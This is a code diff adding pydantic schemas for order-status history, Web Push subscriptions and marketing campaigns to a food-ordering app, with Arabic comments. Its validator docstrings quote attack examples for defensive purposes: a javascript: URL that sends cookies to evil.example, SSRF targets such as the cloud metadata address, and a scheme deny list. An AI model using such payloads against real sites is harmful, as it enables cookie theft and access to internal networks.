@@ -1,12 +1,15 @@
 from __future__ import annotations
 
+import re
 from datetime import datetime
 from decimal import Decimal
 from enum import Enum
 from typing import Annotated, List, Literal, Optional
+from urllib.parse import urlparse
 
-from pydantic import AfterValidator, BaseModel, ConfigDict, Field
+from pydantic import AfterValidator, BaseModel, ConfigDict, Field, field_validator
 
+from app.config import is_allowed_push_endpoint_host
 from app.utils import PHONE_MAX_INPUT_LENGTH, validate_customer_phone
 
 # رقم الموبايل المصري: بيتحقق من صحته على مستوى الـschema قبل أي منطق أعمال.
@@ -546,6 +549,28 @@ class OrderStatusStepOut(BaseModel):
     at: Optional[datetime] = None
 
 
+class OrderStatusEventOut(BaseModel):
+    """سطر واحد في سجل حالة الطلب.
+
+    **الترتيب مهم للعميل:** السطر الأحدث فوق. العميل بيفتح الصفحة
+    عايز يشوف آخر حاجة حصلت، مش أول حاجة.
+    """
+
+    status: str
+    status_label: str
+    at: datetime
+    # اسم الأدمن اللي غيّر الحالة. `None` يعني السطر اتكتب وقت إنشاء
+    # الطلب (مفيش أدمن بعد)، أو الطلب اتغيّر من غير تسجيل دخول.
+    #
+    # **مش بيرجّع `id` ولا `admin_id`:** مفيش داعي يكشف عدّاد داخلي
+    # ولا ID قاعدة بيانات لصفحة العميل.
+    by: Optional[str] = None
+    # `true` = سطر مُختلق من الـbackfill: احنا عارفين إن الطلب كان
+    # في الحالة دي ومش عارفين إمتى اتغيّر. الواجهة بتقول "قبل بدء
+    # السجل" بدل ما تعرض وقت غلط.
+    synthetic: bool = False
+
+
 class TrackedOrderOut(BaseModel):
     """الطلب في صفحة التتبّع.
 
@@ -569,6 +594,10 @@ class TrackedOrderOut(BaseModel):
     currency: str
     items: List[OrderItemOut]
     steps: List[OrderStatusStepOut]
+    # سجل تغييرات الحالة الفعلي (Phase 3). `steps` فوق بيقول "الطلب
+    # وصل الخطوة دي"، و`events` بيقول "إمتى بالظبط ومن عمل إيه".
+    # الطلبات القديمة بسطر واحد مُختلق (انظر `OrderStatusEventOut`).
+    events: List[OrderStatusEventOut] = []
     # طلب `call_center` أو رسوم لسه ناقصة: الواجهة تعرض "هيحددها كول سنتر"
     delivery_fee_label: Optional[str] = None
     # ملاحظة الأدمن (بعض ملاحظات المفاتيح بتظهر للعميل)
@@ -656,5 +685,362 @@ class ReorderOut(BaseModel):
     skipped: List[ReorderSkipped] = Field(default_factory=list)
     subtotal: Decimal
     currency: str
+
+
+# ---------------------------------------------------------------------------
+# Phase 3 — Web Push
+# ---------------------------------------------------------------------------
+
+
+class PushSubscriptionIn(BaseModel):
+    """بيانات اشتراك من المتصفح.
+
+    `p256dh` و`auth` بتيجي من `PushSubscription.toJSON().keys` — بس
+    `app/static/js/push.js` بيفكّ `keys` وبيبعتهم مسطّحين. `expirationTime`
+    بنتجاهله عن قصد: بايتات إضافية من المتصفح مش بنحتاجها.
+    """
+
+    endpoint: str = Field(min_length=1, max_length=600)
+    p256dh: str = Field(min_length=1, max_length=300)
+    auth: str = Field(min_length=1, max_length=200)
+    # `token` = رمز التتبع بتاع الطلب. هو اللي بربط الاشتراك بالعميل
+    # من غير تسجيل دخول. اختياري: المتصفح ممكن يسجّل قبل ما يعمل أي
+    # طلب (الزر على الصفحة الرئيسية).
+    token: Optional[str] = Field(default=None, max_length=200)
+    device: Optional[str] = Field(default=None, max_length=40)
+
+    @field_validator("endpoint")
+    @classmethod
+    def _validate_endpoint(cls, value: str) -> str:
+        """الـendpoint لازم يكون HTTPS URL حقيقي.
+
+        ## ليه مش `min_length=1` بس
+
+        `min_length=1` بيقبل `"   "` — 3 بايت فاضية. السطر ده كان
+        بيتخزّن عادي، وكل محاولة إرسال بتطيح بـ`AttributeError` من
+        `pywebpush` (endpoint مش URL) والـendpoint مات على إشعار العميل
+        من غير سبب مفهوم.
+
+        ## ليه HTTPS إجباري
+
+        الـendpoint هو رابط يتبعتله إشعار فيه **محتوى طلب العميل**
+        (رقم الطلب والحالة). على HTTP، أي حد على الشبكة يقدر
+        يشوفهم ويعدّلهم. المتصفح نفسه مش بيسجّل endpoint غير HTTPS
+        على أصل آمن أصلاً، فده حماية على مستوى الـAPI كمان.
+
+        ## ليه الـhost في allowlist كمان
+
+        HTTPS لوحده **مش كفاية**. بعد التسجيل، `app.push` بيعمل POST
+        للـendpoint ده. فلو قبلنا أي `https://`، الـendpoint بيبقى
+        **SSRF**: حد بيسجّل `https://localhost:8000/admin` أو
+        `https://169.254.169.254/latest/meta-data/`، والسيرفر يعمل
+        لهم طلب من **جوه الشبكة الداخلية** — والرد بيرجع في اللوج.
+
+        عشان كده `is_allowed_push_endpoint_host` بتطابق النطاق
+        بالكامل (مش `endswith` ساذج). النطاق الفرعي بيمرّي عشان
+        المزوّدين بيتمددوا، و`evilgoogleapis.com` لأ.
+        """
+        stripped = value.strip()
+        if not stripped:
+            raise ValueError("الـendpoint فاضي")
+        parsed = urlparse(stripped)
+        if parsed.scheme != "https" or not parsed.netloc:
+            raise ValueError("الـendpoint لازم يكون رابط HTTPS صحيح")
+        # `hostname` مش `netloc`: `netloc` بيضم `user:pass@` والـport.
+        # حد يكتب `https://fcm.googleapis.com@evil.example/` كان هيعدّي
+        # فحص النص لكن `hostname` بيرجّع `evil.example` — وده المطلوب.
+        if not is_allowed_push_endpoint_host(parsed.hostname or ""):
+            raise ValueError("الـendpoint لازم يكون من مزوّد إشعارات معروف")
+        return stripped
+
+    @field_validator("p256dh", "auth")
+    @classmethod
+    def _validate_b64(cls, value: str) -> str:
+        """base64url من غير padding — بالشكل اللي المتصفح بيبعته.
+
+        `auth` بيوصل 16-24 بايت و`p256dh` 65، والاتنين base64url من
+        غير `=`. من غير الفحص ده، قيمة فاضية أو حروف غريبة بتتخزّن
+        والإرسال بيفشل عند المزوّد بـ400.
+        """
+        stripped = value.strip()
+        if not stripped:
+            raise ValueError("القيمة فاضية")
+        if not re.fullmatch(r"[A-Za-z0-9_\-+/=]+", stripped):
+            raise ValueError("القيمة لازم تكون base64url")
+        return stripped
+
+
+class PushUnsubscribeIn(BaseModel):
+    """إلغاء اشتراك — بالـendpoint.
+
+    **ليه نطلب الـendpoint ونعملش DELETE بالمسار:** المتصفح هو اللي
+    لازم يبعت الـendpoint بالظبط. أي تخمين من السيرفر معناه إلغاء
+    اشتراك حد تاني.
+    """
+
+    endpoint: str = Field(min_length=1, max_length=600)
+    token: Optional[str] = Field(default=None, max_length=200)
+
+
+class PushSubscriptionOut(BaseModel):
+    """رد التسجيل — `subscribed` هي اللي بتفرق."""
+
+    subscribed: bool
+    # `true` = اشتراك جديد، `false` = كان موجود واتحدّث. الـfrontend
+    # بيستعملها عشان ما يطلبش إذن تاني من غير داعي.
+    created: bool = False
+    # المفتاح العام بصيغة base64url. **هذا هو** اللي بيتحوّل لـ
+    # `applicationServerKey`. المفتاح الخاص مبيظهرش في أي رد.
+    public_key: Optional[str] = None
+    enabled: bool = True
+
+
+class PushStatusOut(BaseModel):
+    """حالة الإشعارات في المتصفح/العميل.
+
+    الـfrontend بيقرأ `enabled` ويخفّي أو يفعّل زر الإشعارات على
+    أساسه. `supported=false` معناها المتصفح نفسه مش داعم — مفيش
+    نقطة نطلب إذن متصفح مش هيقبله.
+    """
+
+    supported: bool
+    permission: str  # `granted` | `denied` | `default` | `unsupported`
+    subscribed: bool = False
+    public_key: Optional[str] = None
+    server_enabled: bool = False
+    # عدد الإشعارات اللي فاتت للعميل ده — عشان نوقّع نقطة.
+    unread: int = 0
+
+
+class PushNotificationOut(BaseModel):
+    """إشعار واحد في سجل العميل."""
+
+    id: int
+    title: str
+    body: str
+    url: Optional[str] = None
+    status: str
+    created_at: datetime
+    order_id: Optional[int] = None
+
+
+# ============================================================
+# Phase 4 — التسويق
+# ============================================================
+
+
+def _validate_internal_url(value: str, field_name: str) -> str:
+    """يقبل مسار داخلي أو HTTPS مطلق. **يرفض** الباقي.
+
+    ## التهديد
+
+    `link_url` بيتحطّ في إشعار، والعميل بيدوس عليه. لو قبلنا أي
+    رابط، الأدمن (أو حدا سرق جلسة الأدمن) يقدر يبعت إشعار
+    `javascript:fetch('https://evil.example?c='+document.cookie)`،
+    أو `data:text/html,...` بيعرض صفحة مزيفة بتطلب تسجيل دخول تاني.
+    ده هجوم XSS حقيقي عن طريق قناة الإشعارات.
+
+    ## القواعد
+
+    - **مسار نسبي** يبدأ بـ`/` — الوحيد المضمون إنه جوّه موقعنا.
+      `//evil.com` مرفوض: المتصفح بيعامله كـprotocol-relative link،
+      يعني موقع خارجي، لكنه *بيبان* زي مسار داخلي في الـUI.
+    - **HTTPS مطلق** — بس إحنا مش عارفين الأصل من الـrequest. المسموح
+      به هنا هو الـmenu أو صفحة عروض على موقع تاني معروف؛ الـSW
+      بيعمل تحقق تاني من ناحية العميل (`safeInternalUrl`) وبيسمح
+      بنفس الأصل بس.
+    - `http://` مرفوض: إشعار على شبكة غير مشفّرة = قابل للتعديل
+      في الطريق.
+    - `javascript:` و`data:` و`vbscript:` مرفوضة بالاسم.
+
+    ## ليه الخطر بيبقى على العميل
+
+    السيرفر مش هيفتح الرابط، المتصفح هو. فلازم الرفض يحصل **قبل**
+    التخزين، مش عند العرض. عشان كده ده validator في الـschema
+    مش check في الـtemplate.
+    """
+    candidate = value.strip()
+    if not candidate:
+        raise ValueError(f"{field_name} فاضي")
+    if len(candidate) > 600:
+        raise ValueError(f"{field_name} أطول من 600 حرف")
+    # `//host` = رابط خارجية متنكرة كمسار داخلي.
+    if candidate.startswith("//"):
+        raise ValueError(f"{field_name} لازم يكون مسار داخلي يبدأ بـ/")
+    if candidate.startswith("/"):
+        return candidate
+    lowered = candidate.lower()
+    for scheme in ("javascript:", "data:", "vbscript:", "file:", "blob:"):
+        if lowered.startswith(scheme):
+            raise ValueError(f"{field_name} مش مسموح ({scheme})")
+    parsed = urlparse(candidate)
+    if parsed.scheme != "https" or not parsed.netloc:
+        raise ValueError(f"{field_name} لازم يكون مسار داخلي (/) أو رابط https")
+    return candidate
+
+
+class MarketingLinkUrl(BaseModel):
+    """رابط الإشعار — path داخلي أو HTTPS."""
+
+    link_url: str = Field(min_length=1, max_length=600)
+
+    @field_validator("link_url")
+    @classmethod
+    def _check(cls, value: str) -> str:
+        return _validate_internal_url(value, "رابط الحملة")
+
+
+class MarketingImageUrl(BaseModel):
+    """صورة الإشعار — نفس قواعد الرابط.
+
+    الصورة بتترسم في نافذة نظام التشغيل، مش في صفحة بتاعتنا. ده
+    أقل خطورة من الـlink، بس لسه بنطلب HTTPS أو مسار داخلي: صورة
+    من `http://` بتتسرّب لحد تاني على الشبكة.
+    """
+
+    image_url: str = Field(min_length=1, max_length=600)
+
+    @field_validator("image_url")
+    @classmethod
+    def _check(cls, value: str) -> str:
+        return _validate_internal_url(value, "صورة الحملة")
+
+
+class CampaignCreateIn(BaseModel):
+    """إنشاء حملة.
+
+    `audience_type` و`segment_key` بيتحققوا من بعض في
+    `app.marketing.validate_audience_fields` — الرسالة العربية بتاعتها
+    أوضح من رسالة pydantic، والـCHECK في الداتابيز بيفرض نفس
+    القاعدة على مستوى الـstorage.
+    """
+
+    name: str = Field(min_length=1, max_length=120)
+    #: العنوان اللي بيظهر في الإشعار. `name` الداخلي ممكن يبقى
+    #: "حملة تجربة"، والعنوان لازم يكون للعميل.
+    title: str = Field(min_length=1, max_length=160)
+    message: str = Field(min_length=1, max_length=1000)
+    audience_type: str = Field(pattern="^(all|segment|imported)$")
+    segment_key: Optional[str] = Field(default=None, max_length=40)
+    channel: str = Field(default="push", pattern="^(push|whatsapp|both)$")
+    image_url: Optional[str] = Field(default=None, max_length=600)
+    link_url: Optional[str] = Field(default=None, max_length=600)
+    #: `null` = أرسل دلوقتي. تاريخ = جدولة.
+    scheduled_at: Optional[datetime] = None
+
+    @field_validator("image_url")
+    @classmethod
+    def _check_image(cls, value: Optional[str]) -> Optional[str]:
+        if value is None or not value.strip():
+            return None
+        return _validate_internal_url(value, "صورة الحملة")
+
+    @field_validator("link_url")
+    @classmethod
+    def _check_link(cls, value: Optional[str]) -> Optional[str]:
+        if value is None or not value.strip():
+            return None
+        return _validate_internal_url(value, "رابط الحملة")
+
+    @field_validator("name", "title", "message")
+    @classmethod
+    def _strip(cls, value: str) -> str:
+        return value.strip()
+
+
+class MarketingOptOutIn(BaseModel):
+    """طلب تغيير موافقة التسويق من العميل.
+
+    `token` هو **رمز تتبّع الطلب** — نفس آلية `/api/push/notifications`.
+    مفيش تسجيل دخول للعملاء، فالرمز هو إثبات الملكية. من غيره مينفعش
+    نحدّد إن العميل ده هو اللي عايز يرفض.
+
+    `opt_out=True` = "لستقبل". `opt_out=False` = "أنا موافق على العروض
+    تاني" — الموافقة من غير ما نخسر الإشعارات الخدمية.
+    """
+
+    token: str = Field(min_length=8, max_length=200)
+    opt_out: bool = True
+
+
+class MarketingOptOutOut(BaseModel):
+    opt_out: bool
+    opt_out_at: Optional[datetime] = None
+    #: `true` لما العميل رفض. الـUI بيعرض الزرار بالشكل الصح.
+    opted_out: bool = False
+
+
+class ImportBatchOut(BaseModel):
+    """ملخص دفعة استيراد — اللي بيتبان في أعلى شاشة المعاينة."""
+
+    id: int
+    filename: str
+    status: str
+    total: int = 0
+    valid: int = 0
+    invalid: int = 0
+    duplicates: int = 0
+    imported: int = 0
+
+    @classmethod
+    def from_model(cls, batch) -> "ImportBatchOut":
+        return cls(
+            id=batch.id,
+            filename=batch.filename,
+            status=batch.status,
+            total=batch.total_rows,
+            valid=batch.valid_rows,
+            invalid=batch.invalid_rows,
+            duplicates=batch.duplicate_rows,
+            imported=batch.imported_rows,
+        )
+
+
+class ImportRowOut(BaseModel):
+    """سطر واحد في المعاينة.
+
+    `raw_name`/`raw_phone` جنب `name`/`normalized_phone` عشان الأدمن
+    يشوف **اللي في الملف** جنب **اللي عدّلناه**. من غير ده مش هيعرف
+    يفرق بين "الرقم كان غلط" و"النظام وحّده".
+    """
+
+    row_number: int
+    raw_name: Optional[str] = None
+    raw_phone: Optional[str] = None
+    name: Optional[str] = None
+    normalized_phone: Optional[str] = None
+    status: str
+    error: Optional[str] = None
+
+
+class CampaignSummaryOut(BaseModel):
+    """سطر في سجل الحملات."""
+
+    id: int
+    name: str
+    title: str
+    audience_type: str
+    segment_key: Optional[str] = None
+    channel: str
+    status: str
+    total_recipients: int = 0
+    sent_count: int = 0
+    failed_count: int = 0
+    invalid_count: int = 0
+    created_at: datetime
+    scheduled_at: Optional[datetime] = None
+
+    @property
+    def success_rate(self) -> Optional[int]:
+        """نسبة النجاح — `None` لو مفيش محاولة.
+
+        المقام = اللي حاولنا نبعته (`total`)، مش `sent + failed`.
+        لو استعملنا `sent + failed`، الـskipped هتختفي من الحساب
+        والحملة هتبان 100% نجاح وهي فعلياً 70%.
+        """
+        if not self.total_recipients:
+            return None
+        return round(self.sent_count * 100 / self.total_recipients)
+
 
 
